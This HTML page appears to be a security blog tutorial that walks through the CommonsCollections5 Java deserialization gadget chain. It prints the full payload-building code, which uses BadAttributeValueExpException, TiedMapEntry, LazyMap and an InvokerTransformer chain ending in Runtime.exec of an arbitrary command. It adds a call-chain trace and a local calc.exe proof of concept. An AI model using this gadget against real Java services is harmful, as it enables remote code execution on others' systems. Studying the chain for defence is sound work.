<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CommonsCollection5 | zdaylabs</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
      color: #dcdcdc;
      line-height: 1.6;
      padding: 0 2rem;
      min-height: 100vh;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 2rem 0 1rem;
      border-bottom: 1px solid #333;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: #ffffff;
    }
    
    nav a {
      margin: 0 1rem;
      text-decoration: none;
      color: #ccc;
      font-size: 0.95rem;
    }
    
    nav a:hover {
      color: #fef200;
    }
    
    .socials a {
      margin-left: 1rem;
      color: #999;
      font-size: 1.2rem;
      text-decoration: none;
    }
    
    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    
    h1 {
      font-size: 2.5rem;
      color: #fff;
      margin-bottom: 1rem;
    }
    
    h2 {
      color: #fef200;
      font-size: 1.8rem;
      margin: 2rem 0 1rem;
      border-bottom: 2px solid #333;
      padding-bottom: 0.5rem;
    }
    
    h3 {
      color: #fef200;
      font-size: 1.4rem;
      margin: 1.5rem 0 0.8rem;
    }
    
    h4 {
      color: #fef200;
    }
    
    .highlight {
      color: #fef200;
      font-weight: 600;
    }
    
    .accent {
      color: #36d1dc;
    }
    
    p {
      color: #bbb;
      margin-bottom: 1rem;
    }
    
    pre {
      background-color: #1e2329;
      border: 1px solid #333;
      border-radius: 4px;
      padding: 1rem;
      overflow-x: auto;
      margin: 1rem 0;
    }
    
    code {
      color: #36d1dc;
      font-family: 'Courier New', monospace;
    }
    
    a {
      color: #36d1dc;
      text-decoration: none;
    }
    
    a:hover {
      color: #fef200;
    }
    
    ul, ol {
      color: #bbb;
    }
    
    li {
      margin-bottom: 0.5rem;
    }
    
    img {
      max-width: 100%;
      height: auto;
      border-radius: 4px;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">‚ö° ZDaylabs</div>
    <nav>
      <a href="index.html">Home</a>
      <a href="blogs.html">Blogs</a>
      <a href="research.html">Research</a>
      <a href="policy.html">Disclosure Policy</a>
      <a href="contact.html">Contact</a>
    </nav>
    <div class="socials">
      <a href="#">üîóLinkedin</a>
      <a href="#">üê¶Twitter</a>
    </div>
  </header>

  <main>
<h1>CommonsCollection5</h1>


<p>
    THe CommonsCollection5 payload is more or less similar to the CommonsCollection1 payload.<br>
    Just like we used a chain of transformers there we will be Using the same Chain of TransFormers here.<br>

    However the Etnry point is different here.<br>
    Here we will be using  a class called BadAttributeValueExpException class to reach our Goal<br>
    <br>
    So lets jump in and see how the payload looks like
</p>

<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">public</span> BadAttributeValueExpException <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
        <span style="color: #cf8e6d;">final String</span>[] execArgs = <span style="color: #cf8e6d;">new String</span>[] { command };
    
        <span style="color: #6aab73;">// inert chain for setup</span>
        <span style="color: #cf8e6d;">final Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
            <span style="color: #cf8e6d;">new Transformer</span>[] { <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>) });
    
        <span style="color: #6aab73;">// real chain for after setup</span>
        <span style="color: #cf8e6d;">final Transformer</span>[] transformers = <span style="color: #cf8e6d;">new Transformer</span>[] {
            <span style="color: #cf8e6d;">new</span> ConstantTransformer(Runtime.<span style="color: #cf8e6d;">class</span>),
            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new Class</span>[] {
                String.<span style="color: #cf8e6d;">class</span>, Class[].<span style="color: #cf8e6d;">class</span> }, <span style="color: #cf8e6d;">new Object</span>[] {
                <span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>] }),
            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new Class</span>[] {
                Object.<span style="color: #cf8e6d;">class</span>, Object[].<span style="color: #cf8e6d;">class</span> }, <span style="color: #cf8e6d;">new Object</span>[] {
                <span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>] }),
            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"exec"</span>,
                <span style="color: #cf8e6d;">new Class</span>[] { String.<span style="color: #cf8e6d;">class</span> }, execArgs),
            <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>)
        };
    
        <span style="color: #cf8e6d;">final Map</span> innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
        <span style="color: #cf8e6d;">final Map</span> lazyMap = LazyMap.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
    
        TiedMapEntry entry = <span style="color: #cf8e6d;">new</span> TiedMapEntry(lazyMap, <span style="color: #6aab73;">"foo"</span>);
    
        BadAttributeValueExpException val = <span style="color: #cf8e6d;">new</span> BadAttributeValueExpException(<span style="color: #cf8e6d;">null</span>);
        Field valfield = val.<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"val"</span>);
        Reflections.<span style="color: #56a8f5;">setAccessible</span>(valfield);
        valfield.<span style="color: #56a8f5;">set</span>(val, entry);
    
        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers);
    
        <span style="color: #cf8e6d;">return</span> val;
    }
    </pre>
    </div>
    
</p>


<p>
    As we previously know about the ClassCastException and readObject, the same thing happens here as well.
    <br><br>
    Lets Check the source of BadAttributeValueExpException
</p>
<p>
    The BadAttributeValueExpException has the following code block on its class
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">private void</span> <span style="color: #56a8f5;">readObject</span>(ObjectInputStream ois) <span style="color: #cf8e6d;">throws</span> IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.<span style="color: #56a8f5;">readFields</span>();
        Object valObj = gf.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"val"</span>, <span style="color: #cf8e6d;">null</span>);
    
        <span style="color: #cf8e6d;">if</span> (valObj == <span style="color: #cf8e6d;">null</span>) {
            val = <span style="color: #cf8e6d;">null</span>;
        } <span style="color: #cf8e6d;">else if</span> (valObj <span style="color: #cf8e6d;">instanceof</span> String) {
            val = valObj;
        } <span style="color: #cf8e6d;">else if</span> (System.<span style="color: #56a8f5;">getSecurityManager</span>() == <span style="color: #cf8e6d;">null</span>
                || valObj <span style="color: #cf8e6d;">instanceof</span> Long
                || valObj <span style="color: #cf8e6d;">instanceof</span> Integer
                || valObj <span style="color: #cf8e6d;">instanceof</span> Float
                || valObj <span style="color: #cf8e6d;">instanceof</span> Double
                || valObj <span style="color: #cf8e6d;">instanceof</span> Byte
                || valObj <span style="color: #cf8e6d;">instanceof</span> Short
                || valObj <span style="color: #cf8e6d;">instanceof</span> Boolean) {
            val = valObj.<span style="color: #56a8f5;">toString</span>();
        } <span style="color: #cf8e6d;">else</span> {
            val = System.<span style="color: #56a8f5;">identityHashCode</span>(valObj) + <span style="color: #6aab73;">"@"</span> + valObj.<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>();
        }
    }
    </pre>
    </div>
    
</p>
<p>A custom ReadObject implementation.</p>
<p>Which means even if there will be a class cast exception, the code present on the readObject will still be executed.</p>
<p>
    Looking into the code, the point of interest is the valObj.toString()
</p>
<p>IF you pay close attention this valObj is getting set from the gf.get("val") </p>
<p>This particular class also have val variable which gets set via the constrcutors, that in our payload we are sending as null.</p>

<p>SO if we can controll this variable we can make the decission , which toString() to get executed.</p>
<p>In our payload we are setting the val field to the entry via Refelction and the entry is basically a TiedMapEntry Object. </p>
<p>We will not discuss how exactly the TiedMapEntry works, but what happens this class imnplements the map interface and have a fucntion called toString()</p>
<p>So if we pass the entry(Object of TiedMapEntry) to the BadAttributeValueExpException() then then the toString() of TiedMapEntry can be called<br><br>
Diving deep into the toString() we see that the function calls getValue() which indeed calls map.get() </p>
<p>
    <img src="images/cc/TiedMaptoString.PNG">
    <br>
    <br>
    <img src="images/cc/getValueTiedMapEntry.PNG">
</p>

<p>Going back to the payload the Map we  are using is the LaZyMap</p>
<p>And the way we are using LazyMap is by using the decorate function which takes a HashMap and Transformer</p>
<p>
    Lets Review the LaZyMap.get()
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">public Object</span> <span style="color: #56a8f5;">get</span>(Object key) {
        <span style="color: #6aab73;">// create value for key if key is not currently in the map</span>
        <span style="color: #cf8e6d;">if</span> (map.<span style="color: #56a8f5;">containsKey</span>(key) == <span style="color: #cf8e6d;">false</span>) {
            Object value = factory.<span style="color: #56a8f5;">transform</span>(key);
            map.<span style="color: #56a8f5;">put</span>(key, value);
            <span style="color: #cf8e6d;">return</span> value;
        }
        <span style="color: #cf8e6d;">return</span> map.<span style="color: #56a8f5;">get</span>(key);
    }
    </pre>
    </div>
    
</p>
<p>
    So when the TiedMapEntry calls the map.get() the above get gets called.<br><br>
    On the above function , if the key is absent then the transformer.transform gets called where the transfromer is been taken from user and gets intitlised into the LaZyMap<br>
    factory variable via constructors.
</p>
<p>
    <img src="images/cc/LazyMapCodeAnalysis.PNG">
</p>

<p>
    THe TransFormer.transform executes the code , which we have discussed in the previous on how.
</p>
<p>
    So taking all the above, the payload uses the BadAttributeValueExpException() to reach till the transformer like below.
    <br>
    <div style="background-color: #1e1f22; color: #bcbec4;">
      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
      <span style="color: #cf8e6d;">ObjectInputStream.readObject()</span>
          <span style="color: #cf8e6d;">BadAttributeValueExpException.readObject()</span>
              <span style="color: #cf8e6d;">TiedMapEntry.toString()</span>
                  <span style="color: #cf8e6d;">LazyMap.get()</span>
                      <span style="color: #cf8e6d;">ChainedTransformer.transform()</span>
                          <span style="color: #cf8e6d;">ConstantTransformer.transform()</span>
                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
                              <span style="color: #56a8f5;">Method.invoke()</span>
                                  <span style="color: #56a8f5;">Class.getMethod()</span>
                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
                              <span style="color: #56a8f5;">Method.invoke()</span>
                                  <span style="color: #56a8f5;">Runtime.getRuntime()</span>
                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
                              <span style="color: #56a8f5;">Method.invoke()</span>
                                  <span style="color: #56a8f5;">Runtime.exec()</span>
      </pre>
      </div>
      
</p>
<p>
    Below is the slight modification of the above code where we have used java8u202 to execute the payload in locainstnace and instead of using refelction to set the val<br>
    Variable we are directly passing the val varibale to the BadAttributeValueExpException() construtor.
</p>
<p>
    The reason we can not use the same for gadget chain construction is: <br><br>
    if we pass entry directly to BadAttributeValueExpException  then the constuctor there will call the toString() immediately resulting in immeidate code execution and we will not be able craft a serilised payload.<br><br>

This is the reasson why reflection is used to set this variable in the later Stage.<br><br>

This is also a reason why on most of the ysoserial payloads we are using reflection to make the changes in the later satage so that we can craft the serilised payload and doesn't execute code immediately in our local instance.
</p>
<p>
<div style="background-color: #1e1f22; color: #bcbec4;">
<pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
<span style="color: #cf8e6d;">import</span> javax.management.BadAttributeValueExpException;
<span style="color: #cf8e6d;">import</span> java.util.HashMap;
<span style="color: #cf8e6d;">import</span> java.util.Map;

<span style="color: #cf8e6d;">public class</span> cc5 {

    <span style="color: #cf8e6d;">public static void</span> main(String args[]) {
        ConstantTransformer tr1 = <span style="color: #cf8e6d;">new</span> ConstantTransformer(Runtime.<span style="color: #cf8e6d;">class</span>);
        InvokerTransformer tr2 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
            <span style="color: #6aab73;">"getMethod"</span>,
            <span style="color: #cf8e6d;">new</span> Class[]{String.<span style="color: #cf8e6d;">class</span>, Class[].<span style="color: #cf8e6d;">class</span>},
            <span style="color: #cf8e6d;">new</span> Object[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> Class[<span style="color: #b3ae60;">0</span>]}
        );
        InvokerTransformer tr3 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
            <span style="color: #6aab73;">"invoke"</span>,
            <span style="color: #cf8e6d;">new</span> Class[]{Object.<span style="color: #cf8e6d;">class</span>, Object[].<span style="color: #cf8e6d;">class</span>},
            <span style="color: #cf8e6d;">new</span> Object[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> Object[<span style="color: #b3ae60;">0</span>]}
        );
        InvokerTransformer tr4 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
            <span style="color: #6aab73;">"exec"</span>,
            <span style="color: #cf8e6d;">new</span> Class[]{String.<span style="color: #cf8e6d;">class</span>},
            <span style="color: #cf8e6d;">new</span> String[]{<span style="color: #6aab73;">"calc.exe"</span>}
        );
        Transformer tr5 = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
            <span style="color: #cf8e6d;">new</span> Transformer[]{tr1, tr2, tr3, tr4}
        );

        <span style="color: #cf8e6d;">final</span> Map innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
        <span style="color: #cf8e6d;">final</span> Map lazyMap = LazyMap.decorate(innerMap, tr5);
        TiedMapEntry entry = <span style="color: #cf8e6d;">new</span> TiedMapEntry(lazyMap, <span style="color: #6aab73;">"foo"</span>);
        BadAttributeValueExpException val = <span style="color: #cf8e6d;">new</span> BadAttributeValueExpException(entry);
    }
}
</pre>
</div>

</p>
<p>
    <img src="images/cc/cc5CalcPopup.PNG">
</p>


<h4>Summary:</h4>
<ul>
  <li>The gadget uses <code>BadAttributeValueExpException</code> as the entry point during deserialization.</li>
  <li>We set the internal <code>val</code> field to a crafted <code>TiedMapEntry</code> via reflection.</li>
  <li><code>BadAttributeValueExpException.readObject()</code> invokes <code>val.toString()</code>, triggering <code>TiedMapEntry.toString()</code>.</li>
  <li><code>TiedMapEntry.toString()</code> calls <code>getValue()</code>, which leads to <code>LazyMap.get()</code>.</li>
  <li>If the key is missing, <code>LazyMap</code> calls <code>transform()</code> using a user-controlled <code>Transformer</code> chain.</li>
  <li>This chain executes arbitrary code via <code>Runtime.getRuntime().exec()</code>.</li>
  <li>Reflection is used to set the <code>val</code> field after object creation to avoid premature execution ‚Äî this is critical for payload generation.</li>
</ul>

<p>Thats it for Today.</p>
<p>Thanks For Reading.</p>
<p>Happy Hacking.</p>
<p>You can connect with me at:</p>
<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
<p><a href="https://x.com/webspl01t3r">Twitter</a></p>

  </main>
</body>
</html>